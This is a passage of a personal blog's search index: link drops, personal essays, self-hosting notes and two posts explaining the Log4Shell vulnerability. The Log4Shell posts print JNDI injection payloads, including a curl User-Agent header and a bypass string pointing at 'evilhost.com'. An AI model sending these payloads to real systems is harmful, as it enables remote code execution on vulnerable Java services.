[{"categories":[],"contents":" Guidance for Choosing an Elliptic Curve Signature Algorithm in 2022 ","permalink":"https://blog.akendo.eu/flash/23.05.2022-linkdrop/","tags":[],"title":"23.05.2022 - link drop"},{"categories":["News"],"contents":"Pop Culture Has Become an Oligopoly\n","permalink":"https://blog.akendo.eu/flash/19.05.2022-linkdrop/","tags":[""],"title":"19.05.2022 - link drop"},{"categories":["News"],"contents":"Gosh. I\u0026rsquo;ve got a new laptop and recovered my old firefox tabs. Quite some time to get all the link off my window:\nHow to Find a Job (That You Care About!) | Career Advice The Art of Not Taking Things Personally New Neuroscience Reveals 4 Rituals That Will Make You Happy Cisco WebEx Universal Links Redirect HOST HEADER INJECTION ATTACK Cracking the lens: targeting HTTP\u0026rsquo;s hidden attack-surface HTTP RREEQQUUEESSTT SSMMUUGGGGLLIINNG Bad guys love REST REST Security Cheat Sheet Bypassing Web Authentication and Authorization with HTTP Verb Tampering HTTP Desync Attacks: Request Smuggling Reborn Running your own secure communication service with Matrix and Jitsi URL Filter Subversion ","permalink":"https://blog.akendo.eu/flash/10.04.2022-linkdrop/","tags":[],"title":"10.04.2022 - link drop"},{"categories":["News"],"contents":" XSS on Google Search - Sanitizing HTML in The Client? ","permalink":"https://blog.akendo.eu/flash/03.02.2022-linkdrop/","tags":["Kubernet","Neuvector"],"title":"03.02.2022 - link drop"},{"categories":["General"],"contents":"Happy new year everyone!\nWith this post, I\u0026rsquo;ve finished the last post of my 100daystooffload! What a ride, 100 blog posts in one year.\nbest regards,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-12-31-happy-new-year/","tags":["100DaysToOffload"],"title":"Happy New Year"},{"categories":["Git"],"contents":"For a longer time now, I’m using gogs to host my git code. However, since beginning of this year, there are some problems. Mostly, that I can’t update anymore to the next versions of gogs (+0.12.1). Besides this, are there some features that I really want to use. These feature has been requested, but I heard, that the core developers isn’t supposedly a nice guy1 and does not implement them. Long story short: A fork was created: gitea.\nIn this post, I try to figure out if a migration is possible or not. The fork was some time ago and there were change made, that break the migration: Meaning at some point it is not possible to switch anymore. This point was fork release 0.9.146 for gogs.\nHere is the catch, I’m using the version 0.12 at the moment. So let’s hope that the migration is working. Main problem is that I need to start with gitea in version 1.0 and slow migrated to the latest version. However, it might be some trouble because the database schema diverting quite a bit.\nFirst is to reproduce my production state on my laptop locally. I replace the gogs docker image with the gitea image and try to see what’s happening. On the website from gitea, a docker-compose example is presented that I’m using for this.\ndocker-compose stop gogs Rsync the data down to the example docker-compose file of gitea. Next is to rename the given databases to the right version. gogs.db becomes gitea.db.\ngogs-data \u0026gt; $ mv gogs/ gitea I forgot to upgrade the path of the log file and run into follow error:\ngitea | panic: mkdir /app/gogs: permission denied gitea | gitea | goroutine 1 [running]: gitea | panic(0x55db51367260, 0xc4203a80f0) gitea | /usr/lib/go/src/runtime/panic.go:500 +0x1a5 gitea | code.gitea.io/gitea/modules/setting.newLogService() gitea | /srv/app/src/code.gitea.io/gitea/modules/setting/setting.go:794 +0xdda gitea | code.gitea.io/gitea/modules/setting.NewServices() gitea | /srv/app/src/code.gitea.io/gitea/modules/setting/setting.go:943 +0x1b gitea | code.gitea.io/gitea/routers.NewServices() gitea | /srv/app/src/code.gitea.io/gitea/routers/init.go:37 +0x16 gitea | code.gitea.io/gitea/routers.GlobalInit() gitea | /srv/app/src/code.gitea.io/gitea/routers/init.go:47 +0x158 gitea | code.gitea.io/gitea/cmd.runWeb(0xc4202eb900, 0x0, 0xc4202eb900) gitea | /srv/app/src/code.gitea.io/gitea/cmd/web.go:158 +0xa7 gitea | code.gitea.io/gitea/vendor/github.com/urfave/cli.HandleAction(0x55db513819e0, 0x55db5147be68, 0xc4202eb900, 0xc4201add00, 0x0) gitea | /srv/app/src/code.gitea.io/gitea/vendor/github.com/urfave/cli/app.go:471 +0xbb gitea | code.gitea.io/gitea/vendor/github.com/urfave/cli.Command.Run(0x55db50e4ee34, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55db50e703e1, 0x16, 0x0, ... ) gitea | /srv/app/src/code.gitea.io/gitea/vendor/github.com/urfave/cli/command.go:191 +0xcc9 gitea | code.gitea.io/gitea/vendor/github.com/urfave/cli.(*App).Run(0xc420377040, 0xc42000c140, 0x2, 0x2, 0x0, 0x0) gitea | /srv/app/src/code.gitea.io/gitea/vendor/github.com/urfave/cli/app.go:241 +0x6a5 gitea | main.main() gitea | /srv/app/src/code.gitea.io/gitea/main.go:42 +0x356 When evertyings was done proper, this should look like this:\ndocker-compose up [+] Running 1/0 ⠿ Container gitea Created 0.0s Attaching to gitea gitea | Dec 29 21:22:29 syslogd started: BusyBox v1.24.2 gitea | Dec 29 20:22:29 sshd[16]: Server listening on :: port 22. gitea | Dec 29 20:22:29 sshd[16]: Server listening on 0.0.0.0 port 22. gitea | 2021/12/29 21:22:29 [T] Custom path: /data/gitea gitea | 2021/12/29 21:22:29 [T] Log path: /app/gitea/log gitea | 2021/12/29 21:22:29 [I] Gitea v6aacf4d2 gitea | 2021/12/29 21:22:29 [I] Log Mode: File(Info) gitea | 2021/12/29 21:22:29 [I] Cache Service Enabled gitea | 2021/12/29 21:22:29 [I] Session Service Enabled gitea | 2021/12/29 21:22:38 [I] Git Version: 2.8.3 gitea | 2021/12/29 21:22:38 [I] SQLite3 Supported gitea | 2021/12/29 21:22:38 [I] Run Mode: Production gitea | 2021/12/29 21:22:39 [I] Listen: http://0.0.0.0:3000 Now you should be able to run the webserver. I’ve tried to log in, however, the release databases schema seems invalided to the running version. Which makes sense, there have been some upgraded happening between these versions.\nMaybe the database was left in an inconsistent state after I’ve tried to upgrade to 0.12.1 earlier this year. That makes the hole things very messy now.\nI could try to make sense of the database\u0026rsquo;s schema and see what have changed, or I start anew. Okay, let’s check the database thing first. What version do we have? We can use .header and .colume for some better formated output:\nsqlite3 gogs.db .header on .mode column SELECT * FROM version; id version -- ------- 1 19 Okay, when we look at gitea, we have what version? 170? Fuck, but that’s for the latest version. When we jump back to version 1.0.2, we see that the version is 4 and the migration scrips are executing to 13 or 14.\nHowever, there is about of different news to this: that is the following:\nHi there, thank you for using Gogs for so long! However, Gogs has stopped supporting auto-migration from your previously installed version. But the good news is, it\u0026rsquo;s very easy to fix this problem! You can migrate your older database using a previous release, then you can upgrade to the newest version.\nYacks… Meaning that we need to understand how the codes does perform the migrations? Sight. That’s going to be a hack.\nAt this point we can do two things: Revert the changes of the databases to a state in which the migration script can handle the migration or setup new and populate the new gitea with the old data. This is it for now!\nBest regards,\nakendo\nFrom what I have seen in the git repository of the project, I can’t confirm it, but I haven’t seen very little of it. From the little I saw he was super on point. Disregard, features I need are missing and that’s the core point.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://blog.akendo.eu/post/2021-12-29-gogs-migration-to-gitea-part1/","tags":["gogs","gitea","100DaysToOffload"],"title":"Gogs migration to gitea - part 1"},{"categories":["News"],"contents":" XSS on Google Search - Sanitizing HTML in The Client? DO NOT USE alert(1) for XSS How much water should you drink a day? ","permalink":"https://blog.akendo.eu/flash/29.12.2021-linkdrop/","tags":["XSS","water"],"title":"29.12.2021 - link drop"},{"categories":["CI/CD"],"contents":"Had finally some time to figure out a good process for blogging on the phone. I’m using Termux to keep track of the files. At first, I used the integrated vim. This is not that nice because the Touchscreen is not well working here with vim.\nIn between, I’ve migrated my hackmd to Hedge Doc. However, it still has the same problems as hackmd. Hence, using it for blogging wasn’t an option.\nFor a while, things remained on hold, until I realized that I need to use a more proper editor, vim will do. Once the CI/CD will be deployed, I can push blog posts from the phone and get them deployed!\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-12-28-blogging-on-the-phone/","tags":["Android","100DaysToOffload"],"title":"Blogging on the Phone"},{"categories":["CI/CD"],"contents":"I\u0026rsquo;ve got some time to get back to CI/CD project. At this state I need a way to trigger the update the blog sources from git. For this I create a small shell script that will update the git repo. It listen on port 7777 and triggers a pull.\n#!/usr/bin/env bash echo \u0026quot;[run-updater]: Starting\u0026quot; test -f /tmp/updater.pid \u0026amp;\u0026amp; kill $(cat /tmp/updater.pid) \u0026amp;\u0026amp; rm /tmp/updater.pid \u0026amp;\u0026amp; echo \u0026quot;[run-updater]: Restart updater\u0026quot; echo $$ \u0026gt; /tmp/updater.pid while true; do echo -e \u0026quot;HTTP/1.1 204 No Content\\r\\nConnection: close\\r\\n\\r\u0026quot; | nc -l 0.0.0.0 7777; bash update.sh done Next is to run the hugo server\n#!/usr/bin/env bash test -f /tmp/hugo.pid \u0026amp;\u0026amp; kill $(cat /tmp/hugo.pid) #TMP_DIR=$(mktemp -d) #cd $TMP_DIRS cd /tmp/ test -d Blog || git clone --recursive ssh://git@git.akendo.eu/akendo/Blog.git cd Blog git pull hugo hugo server -D -b $IP --bind $IP \u0026amp; pgrep hugo \u0026gt; /tmp/hugo.pid cd tools bash run-updater.sh \u0026amp; Now I can git commit from my phone and trigger it via curl build.akendo.eu 7777 (this is just a example). Next is to create a docker container in which the process is executed. For this I pull an archlinux image and install hugo. Now I need to sync the git sources into the docker container. But I do this tomorrow.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-12-27-cicd/","tags":["100DaysToOffload"],"title":"CI/CD"},{"categories":["Android"],"contents":"I\u0026rsquo;ve updated my Android phone and wanted to adde some note about to it. When you migrated, make sure that your signal backups are working. I had several issues to restore the data. I might have missed one number or something. At least, I wasn’t able to restore my data.\nThe problem is that the newest version of Android isn’t able to update databases with its lock. The files are inconsistent between versions. Remove your passphrase and/or fingerprint for unlocking before. Otherwise, your display isn’t able to unlock properly. I had to delete the file and this caused Signal to turn bad. It noticed that this files has changed and therefor refuses to operated. It causes a trace, that points to some changes in the API.\nlocksettings clear --old xxxx I’ve tried to unlock it via the adb shell access that I still had open. However, it wasn’t able to unlock it, even with the proper tool for it. Additionally, before you update your ROM, you should update the TWRP to the latest as well. It could occur that flashing of the newer ROM might go awry.\nOtherwise, does Android 12 looks quite well.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-12-26-lineageos/","tags":["LineageOS","100DaysToOffload"],"title":"LineageOS update"},{"categories":["General"],"contents":"I wish everyone a merry Christmas!\nBest regards,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-12-24-merry-christmas/","tags":["100DaysToOffload"],"title":"Merry Christmas"},{"categories":["General"],"contents":"In past days, we had a lot of discussion about the subject of suffering. The gist of it was that people tend to believe that suffering should be avoidably at any cost. We see this reflected in different part in our society. Noticeable regarding physical and live treating harm, this might be the right approach. However, once we move to emotional distress, this patter will be continued without any second thoughts. Much of the discussion evolve often around this very fact, even without acknowledge it.\nThe main fallacy here is, in my option, is, that we believe that it is good to avoid any harmful at all. It creates a dangerous narrative that is not fulfillable. Simply, because we cannot avoid suffering. I think this is a halfhearted developed of emotional intelligence, but we only live it by the narrow fact that words can cause suffering, but not grow.\nSuffering is friction. When we move through our live, we will always be confronted with resistance, and here is the catch of the discussion: Many people who believe this does not believe that there are not worth suffering. Hence, suffering needs to be avoided. The main aspect is that many are unable to endure the suffering.\nThe important is the following: To have fate that everything is becoming good eventually. In English, we call this basic trust, however, the German word “Urvertrauen” is here much more a fit. It describes the feeling that things turn out to be okay. Something we often can experience with something close like a caregiver. The feeling that everything becomes all right. To be accepted and loved for who you are.\nHere is my theory: Much people leak the necessary \u0026ldquo;Urvertrauen\u0026rdquo; - that things turn out to be okay. They think that emotional distress is violations and needs to be suppressed.\nMany I met with this philosophe are people that, I sensed, had a troubled pasted and missing this curtail aspect of the human experience.\nIs anyone worth suffering for? Which bring me to the point from before: Suffering is unavoidable. It is a decision problem. There is a piece of information that you need to judge if It\u0026rsquo;s going to become hurtful or not. But you can’t, hence you degraded the quality of the information to a degree that it fits everyone and is depleted of any meaning.\nLook at pop culture and ask yourself what does it try to express? Much of the meaning has moved away, so it fit the most of us all. When there is nothing too offending, there is nothing to care of. But it creates noise that feeds into the machine of the autopilot we’re living in. Suffering disrupts it. Our brain has brilliant strategies to avoid it. For a simple and crushing reason: to survive.\nLive does not need to be nice to you to survive, you just have to stay long enough alive. Suffering needs to be done right, to little, and we only see it as a disturbance. Too much, and we descent into chaos.\nHere is the problem, when is this enough?\nI feel like that much people went into the discord of suffering and can only remember it. But as often, we’re blinded by the outcome of things. Not the growth that this pain has made. Here is my though: When the suffering becomes bigger than the growth, it might be too much.\nLikewise, we have developed so much senses in live to detect pain. Hell, our modern life makes it almost impossible to avoid being confronted. Just by learning to see that data more by data, it causes pain. Not considering the fact that we have the (un)natural tendency to compare ourselves on the way with everyone and everything! Fuck!\nOne blind spot people, however, miss typically out is that other suffers for them too. Without knowing, it. Which raises the question Is there anyone worth suffering for?\nI\u0026rsquo;ve learned in the past years that the best way to cope with this, to go where the pain is. And we have to distinguish about the physical sense of pain like walking through fire (it is hot and burns you, don’t do it) and the emotion pain that should prevent us from going out of the social normal that ensure our survive.\nModern life does not need this anymore and allows us to go beyond this. WE can go down the deep pain that has molded us and maybe, just maybe, understand them. This makes the understanding about pain so painful.\n","permalink":"https://blog.akendo.eu/post/2021-12-23-suffering/","tags":["100DaysToOffload"],"title":"Suffering"},{"categories":["todayilearned"],"contents":"\nToday, I have learned that we humans fall prey to ‘directionally motivated reasoning’. It is the fact that humans take information presented to them and fit it to the narrative that they believe in. They abandoned information that contradict it start to seek for more information that supports the belief people have.\nThis behavior is often addressed with confirmation bias, rationalization and so on.\n","permalink":"https://blog.akendo.eu/whathaveilearned/2021-12-22-what-i-have-learned-today/","tags":["psychology","100daystooffload"],"title":"What I Have Learned Today"},{"categories":["General"],"contents":"Recently, I noticed a pattern in my own behaviour and I like the insight about this here.\nI’ve watched some videos regarding psychology. Namely, from Dr.K. he states that he has been trained to follow the path a conversation goes and trying to make sense of the path.\nIn the past days, I made something similar. About some part of decisions and the implication that comes with it. Most notably: Buy things.\nMy monitor broke down in the last year and I need some new screens. Hence, I start to look for a fitting replacement. Here is the catch. Somewhere in the back of my mind, I wanted to haver a 4k Monitor.\nNext things are that I start to look for all sort of monitor things, like HDR, 144Hz and 4k and suddenly the price for the monitor becomes high. But the real thing that is for what? I have on my to-do list to play the Witcher III with 4k.\nThat’s something that I might going to do, but it reflects only a fraction of the time I use this screen for. I read a lot, work and hacking on a terminal. For this, tasks I do not need 4k, hell not even 144Hz or HDR. So, why the fuck I do need to search for a monitor that costs 800 Euro?\nReflecting this fact more down, It turns out to be quite a pattern in my life. One that is causing me a lot of trouble, but is likewise a big source of my success.\nMy theories at the moment is that I want to have the best things to make sure to get the best out of money and time. It is a status symbol. Look eat my things how much it is worth. Therefore, I need to be important and valuable as well, right?\nIt’s a bit like buying an Apple device, you’re doing it mostly to project an image of wealth that you can afford it. It does not need to solve your problem, and that’s what you can see are these devices are made for.\nThis distracts me for the problem I actually want to solve. Instead, I get side-tracked and start to fuck up badly.\nAnother example is my laptop. I used to buy the massive and clumpy for what? I single use cases that never really came to be.\nThis can be even seen in the way I direct my attention to things: I’m 100% with you or completely not. Currently, I’m writing some fanfic and I notice how myself I\u0026rsquo;m planning to go down the entirety of the lore of that world to get every detail right and have a perfect story.\nOr when I was younger and was thinking that only Free software should be allowed. Because otherwise it is not trustworthy.\nAll of these points to me to the same shortcoming: Self-worth.\nI want others to see me as something of value, that it is worth spending time with me. The extremes in my decision-making help me to get the impression that I’m worth it. That my thinking is the right one because it when I feel it. When it is only 80%, it does not feel go because people might consider it inferior.\nDoes it solve the problem? Yes, but it is the inferior solution! You must be better.\nEven this blog is a reflection of it, I think. However, likewise it helps me to grow and improve and that’s a good thing. Realizing this helps me to see my problem for what there are, and I’m trying to address. Maybe it will be better next year.\n","permalink":"https://blog.akendo.eu/post/2021-12-21-extremes/","tags":["100DaysToOffload"],"title":"Extremes"},{"categories":["General"],"contents":"Did you ever felt like that you’re not getting anything done? Like you’re missing the air to breathe? The space to move along? To many meetings, too much to do and too many things on your list. Due to other reason, I had to think about the subject of structure. I developed many routines about things. But here is my though: Did I develop a structure that blocks me from doing the things I want to?\nFor instance, I like to keep an overview of the news, podcasts and on so on that I’ve read. I put these in one way or the other into my documentation system.\nExpect that this have the key problem, that I can\u0026rsquo;t process all the news I read over the course of a day. Causing me to process way more stuff than I can handle. So, I don\u0026rsquo;t do anything at all.\nSo, things pile up. Which is okay, so you have the next habit to cope with that. Which means; Write the things done you still want to process and do it eventually.\nExpect that is never. So, I was stuck with the idea of keeping track of information, where the value of gratification is seldom. Sure, I had several occasions in which the process of this information become valuable, however, when I think about it, it is a pattern of the fear of missing out(FOMO).\nUnlike the typical FOMO we know from social media, I think it is about the concern of missing out the validation people have when you know something. The fact that this information might be necessary later in time and this is the one information to be essential to be there and not knowing it causes me to lose control.\nReflection about this give me the impression that FOMO is not quite the things, but the closest feeling that might make it more understandable. Maybe it isn’t it become I rather seek for the information with it value and make a naive prediction into the future about disregards of the reality of it.\nDisregards, it shows the problem with creating habits and/or structures without consider the second or third order implication of it. Foremost, that such habits often not scale well and the cost of time are often not foreseeable.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-12-20-suffocating/","tags":["100DaysToOffload"],"title":"Suffocating"},{"categories":["Linux"],"contents":"Short note: One of my script that uses grep broken down in the last week:\ngrep: access.log: binary file matches That’s strange, what happened?\nSeems like that some bot dropped some binary code into my webserver to exploit some old PHP thingy. However, my system does not care because it does not run PHP. Nevertheless, I can’t parse my logs now. To fix this grep has to treat the binary part like textwith the parameter -a.\nShort note: One of my script that uses grep broken down in the last week:\ngrep: access.log: binary file matches That\u0026rsquo;s strange, what happend?\nSeems like that some bot dropped some binary code into my webserver to exploit some old php thingy. However, my system does not care, because it does not run PHP. Nevertheless, I can\u0026rsquo;t parse my logs now. To fix this grep has to treat the with the parameter -a.\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-12-19-grep-binary/","tags":["100DaysToOffload"],"title":"Grep binary"},{"categories":["Security"],"contents":"I did not have much time to get to the log4j exploitation part. There are quite some interesting way to make use of the JDNI feature. Just yesterday, another improvement of it has been discovered.\nWith the version 2.15 of log4j, they changed the behavior of the lookup() function to be restricted. However, this can be bypassed.\nThe bypass was posted yesterday morning by Márcio Almeida on Twitter:\n${jndi:ldap://127.0.0.1#evilhost.com:1389/a} He explains how it works because while the java.net.URI getHost() resolves localhost, the lookup() function of log4j will still try to resolve the completed URL with the shebang. Hence, it still will try to connect to the evilhost. I think it is because the LDAP resolve effectively again and therefor bypass the localhost filter.\nThis confirms the initial suspicion of the Luna sec guys. Besides of this, the mitigation does not only work, it also points to the core fact, that the vulnerability remains usable in the fix in scope of a corner-cases: When using the Thread Context Map. It is a feature for multithreading, I think, and there the mitigation does not work. The only solution is to update to 2.16 where the JDNI feature has been completely removed. Something that make more sense even now.\nbest regards,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-12-18-log4shell2/","tags":["Java","100DaysToOffload"],"title":"Log4Shell part two"},{"categories":["Security"],"contents":"Okay, at this point you already have heard of the new hot shit in the infosec: Log4shell or CVE-2021-44228. In case you don’t, here is the news: Log4Shell is a Zero-day vulnerability within the default logging facility of Java. This was the 10th of December. At this stage everyone has rushed to shodan and to find for services, application or anything that run with Java that takes any input and logs it.\nBackground about log4j Log4j is more than just a framework for logging. It exists also in different implementation for PHP. There are some unofficial ports as well. It is out since around 1996. To make use of log4j, your code has to Initialize an instance of it. I’m using here the example code from the of LunaSec:\nstatic Logger log = LogManager.getLogger(YOUCLASSNAME.class.getName()); Now you can use logging in your code to created different types of message:\nlog.debug(\u0026quot;Request User Agent:{}\u0026quot;, userAgent); That’s it. Nothing special about. So, what’s going wrong here? So in the report of the LunaSec, they created simple HTTP Server that will print out the user agent of a client. To exploit this flaw, we need to provided the malicious payload:\ncurl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://127.0.0.1/a}' Now, your Java codes start to fetch the resource a from localhost and tries to execute it. Why? That’s what the JDNI in the string does. There were some more change Oracle disabled. But the LDAP feature remain working until now. The exploit might require a bit more effort to have a workaround in place. However, it is just some more effort.\nBackground about JDNI For this, we need to take a look at the JDNI keyword. There is a lot of resource about that subject, in its core it is a basic vulnerability. The default logging facility provides the ability to utilizes the JDNI standard. The ‘Java Naming and Directory Interface’ or JDNI is an API for the utilization of a directory or name service like LDAP.\nIt should allow looking up for external resources. This is useful when you do not quite not know where your databases will be and defining this RMI type to. Effectively is this an RPC type of services, but as always, a java like fashion. They support:\nDomain Name Service (DNS) Lightweight Directory Access Protocol (LDAP) Java Remote Method Invocation (RMI) Registry Common Object Request Broker Architecture (CORBA) Common Object Services (COS) name service Older versions of log4j seems to be not affected. Different feature has been disabled. For instance, the RMI feature was disabled with the release of Java 8u121.\nRMI has been disabled in later version of Java that minimizes the attack vector. However, there might be quite some workarounds for this. To exploit this vulnerability, you can utilize something called marshalsec. This is general deserialization problem of the Java RPC not able to ensure that not something bad is happening and leading to RCE in this case. So, this might apply to the vulnerability as well.\nWe knew about the capability of JDNI at least since 2016. On the BlackHat, this was documented in a white paper!\nImpact This vulnerability was introduced in 2013. Meaning that we’re having a zero-day for around 8 years by now. Good Luck, check if it has been exploited before.\nIt is a dead simple vulnerability, it out-weight hearthbleed, and does not require much knowledge to exploit. Hearthbleed on the other side did only return random memory samples at had at least a a bit of effort that need to be put to make sure that this was useful. Creating this string is childlike easy, and running a server that can provide the necessary Java Class is effortless at this time.\nMore wire is that we can see that almost all vendors are affected. Even renaming your iPhone causes the something within the iPhone to execute it. It is so wildly deployed that it might be on Mars! Now that’s a fix to roll. Good thing, that there is no Internet on Mars.\nResponses When you have an application with Java in it, you most likely have log4j running. Hence, I advise you to disable it. This is a 10/10 in the CVE score. It does not become worse. The log4j have nuked the feature just now. We see attacks that aims to exploit this, worms that should be in development and ransomware that starts to exploit it.\nEven with a up-to-date Java, you aren’t safe. Some people have done great responses to mitigate it. The best fix so far is from Cyberreason. But in the end, the best is to install the latest version of log4j and be done with it.\nbest regards,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-12-13-log4shell/","tags":["Java","100DaysToOffload"],"title":"Log4Shell"},{"categories":["General"],"contents":"One thing that turn a bit of a show stop is the hugo server, there were some changes made in hugo that breaks my template, I guess. Let\u0026rsquo;s see it again:\n~/B/blog (master)\u0026gt; hugo server -D Start building sites … hugo v0.89.0+extended darwin/amd64 BuildDate=unknown rst2html / rst2html.py not found in $PATH: Please install. Leaving reStructuredText content unrendered. Error: Error building site: failed to render pages: render of \u0026quot;page\u0026quot; failed: execute of template failed: template: _default/single.html:5:5: executing \u0026quot;main\u0026quot; at \u0026lt;partial \u0026quot;single/post-info.html\u0026quot; .\u0026gt;: error calling partial: \u0026quot;Blog/blog/layouts/partials/single/post-info.html:21:30\u0026quot;: execute of template failed: template: partials/single/post-info.html:21:30: executing \u0026quot;partials/single/post-info.html\u0026quot; at \u0026lt;.\u0026gt;: range can't iterate over General Built in 622 ms For some reason, the range command does not iterator anymore over categories, but why? I’ve modified the original template to include a category field to make the post a bit more friendly to find some other posts.\n{{ $taxonomy := \u0026quot;categories\u0026quot; }} {{- if $taxonomy}} \u0026lt;span\u0026gt; posted in {{ with .Param $taxonomy }} {{ range $index, $category := . }} {{ with $.Site.GetPage (printf \u0026quot;/%s/%s\u0026quot; $taxonomy $category) -}} \u0026lt;a href=\u0026quot;{{ .Permalink }}\u0026quot;\u0026gt;{{ $category | urlize }}\u0026lt;/a\u0026gt; {{- end -}} {{- end -}} {{ end }} So, something goes wrong when something is happening in the drafts? Maybe a recent change I’ve made to a file? Let’s check them, maybe some categories are malformed in a post that is still in draft?\nHm… I have many posts that are … in a less optional state…\nSo, let\u0026rsquo;s see how many posts are there? What!? 280 Posts? Gosh….that’s a lot… Next is to see how many of them are drafts. 62 are with the newer format and 5 are with the older one.\nOkay, my working theories is the following: I’ve an incomplete post that has an out-dated header OR incomplete one. Here’s the challenge: I have to go through 280 pages and check it has the correct header formatting or not. hm… crap… That shouldn\u0026rsquo;t be it. But I guess I’ll post about this some when more…need to debug…\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-12-11-hugo-draft/","tags":["hugo","100DaysToOffload"],"title":"Hugo Drafts"},{"categories":["Security"],"contents":"Some days ago, we had an interesting discussion about Galois/Counter Mode (GCM). While I cannot expose the exact context, instead I like to share some comments about that matter here.\nGCM is a way to operate with symmetric-key cryptographic like AES. Also, GCM is a NIST standard, which is why I would generally avoid a recommendation here. The reason is that we knew since Edwards Snowden relation that the NSA has jasperized standards. Here is an example regarding GCM:\nPolynomial MACs violate intuitive expected properties of cryptosystems, and are so finicky to work with that even the specification for AES-GCM contained invalid proofs of its security.\nAlso:\nGiven all these great features, you might ask: why does everyone hate GCM? In truth, the only people who hate GCM are those who’ve had to implement it. You see, GCM is CTR mode encryption with the addition of a Carter-Wegman MAC set in a Galois field. If you just went ‘sfjshhuh?’, you now understand what I’m talking about. Implementing GCM is a hassle in a way that most other AEADs are not. But if you have someone else’s implementation — say OpenSSL’s — it’s a perfectly lovely mode.\nWithin the community, there were some upheavals regarding this topic, also because there was a recommendation in between not to use AES-GCM for OpenSSH. The problem at this point is that some information such as the packet are not encrypted. There are also issues with GCM when the amount of data is larger than the actual block size.\nThe security of the connection depends on the quality of the random numbers. As soon as an IV or nonce is reused, the security of the connection is no longer guaranteed! It is then possible to decrypt the data streams that have gone before, I think.\nIn the end, the responsibility lies with the implementation, if OpenSSL is used here, it can be okay?\nThe advantage of GCM lies in the independence of the respective steps, which can be carried out in parallel without putting it into hardware. Completely in contrast to AES.\nThe real question is how much you trust the implementation to screw with their random numbers. Please take all of this with a grain of salt. I’m not a cryptographer, just very interested in the topic.\nBest regards, akendo\nhttps://wiki.openssl.org/index.php/TLS1.3\nhttps://www.netspi.com/blog/technical/cloud-penetration-testing/azure-cloud-vulnerability-credmanifest/\nhttps://jedisct1.gitbooks.io/libsodium/content/secret-key_cryptography/aes-256-gcm.html https://stribika.github.io/2015/01/04/secure-secure-shell.html https://de.wikipedia.org/wiki/Nonce https://crypto.stackexchange.com/questions/33812/is-it-acceptable-to-write-the-nonce-to-the-encrypted-file-during-aes-256-gcm https://crypto.stackexchange.com/questions/26790/how-bad-it-is-using-the-same-iv-twice-with-aes-gcm https://blog.cryptographyengineering.com/2012/05/19/how-to-choose-authenticated-encryption/\nhttps://en.wikipedia.org/wiki/Galois/Counter_Mode https://security.stackexchange.com/questions/184305/why-would-i-ever-use-aes-256-cbc-if-aes-256-gcm-is-more-secure\nhttps://security.stackexchange.com/questions/234202/performance-comparison-between-aes256-gcm-vs-aes-256-sha-256\nhttps://mccarty.io/cryptography/2021/11/29/chacha20-blake3.html\n","permalink":"https://blog.akendo.eu/post/2021-12-07-aes-gcm/","tags":["100DaysToOffload"],"title":"AES GCM"},{"categories":["News"],"contents":" Secrets Of The Great Families Display notification from the Mac command line Watch Your Step(ping): Atoms Breaking Apart Windows 10 RCE: The exploit is in the link Why use XChaCha20 ","permalink":"https://blog.akendo.eu/flash/07.12.2021-linkdrop/","tags":[],"title":"07.12.2021 - link drop"},{"categories":["docker"],"contents":"I\u0026rsquo;ve created a docker-compose.yml file for to run draw.io:\ndraw: restart: always image: fjudith/drawio ports: - \u0026quot;${IP_ADDRESS}8180:8080\u0026quot; depends_on: - nginx-proxy environment: - VIRTUAL_HOST=draw,draw.akendo.eu - VIRTUAL_PORT=8080 Nothing special, but I felt like sharing it here. You can run it with docker-compose up draw\nBest regards, akendo\n","permalink":"https://blog.akendo.eu/post/2021-12-06-draw.io/","tags":["100DaysToOffload"],"title":"Draw.io"},{"categories":["News"],"contents":" Thinking about “traceability” ","permalink":"https://blog.akendo.eu/flash/06.12.2021-linkdrop/","tags":[],"title":"06.12.2021 - link drop"},{"categories":[],"contents":"In my understanding, talent does not matter. Most people who do a thing do not have any of it. It\u0026rsquo;s rather that their commitment of time and effort that is rewarded.\nOr that is what I think. There is nothing like talent. It is one of this concept we tend to overrated and everyone who seems to be more invested into a difficult subject becomes talented in the viewer eyes. One essence of talent is that these people are rather exceptional, whatever that means.\nThere are rare occasion in which the ‘talent’ of person could be seen at best. That’s in completions. However, I feel like we often do not hire the best, instead, we hire the person who has what we need. At least that’s how I feel like people hire me.\nDepending on the context of the field, this is frequently represented with experience. Which become mixed up with people personal commitment and then seen as talent.\nTo put this into a metaphor: Imaging a basket full of fruits. It has different flavor of a kind and sometimes exotic ones. Your goal is to make a pie. So go through the basket to look for the best fruits. In most cases, we would have more fruits than necessary and when then select the best ones. Instead, what we have is insufficient amounts. We barely have enough to make our pie.\nWhat do you do? You sort the worse one out and the take them to make your pie. That\u0026rsquo;s what we call the survivor bias. There are quite some limits to this image, unlike a real pie your people do not vanish once the pie is baked and next is that you can help them to improve.\nInstead, one is there because the space requires more people than there is, and the only one left that fit the need. It does not me the best hire, it makes me the least painful one.\nBe turned to a topic is good things, but that’s what training is for. The thing is, when you learn about a topic, and you’re doing it good, you become keen about it. But that’s not talent, but commitment.\nAny way, best regards akendo\n","permalink":"https://blog.akendo.eu/post/2021-12-04-talented/","tags":["100DaysToOffload"],"title":"Talented"},{"categories":[],"contents":"To the beginning of this year I’ve decided to write more for this blog and since then, the end of 2021 is coming to a close. I did check how much is left of writing. Turns out, around 20 posts are missing. That’s not that bad.\nI have at least a docent of posts left in an unedited state for posting, hence, all I need to do to take them and turn it into a readable post.\nAs always, I’m quite sidetracked with a lot of distraction that makes writing and the task around it less attractive… The good thing about this challenge is that there is no requirement to have quality content online., so short one or two liners would be working as well.\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-12-04-100daysofwriting/","tags":["100DaysToOffload"],"title":"Almost 100 Days of writing"},{"categories":["general"],"contents":"Today, my bike was stolen. Technically, it was stolen some time ago, but I just learned about it today. It feels like it is likely my own fault. Some time ago I 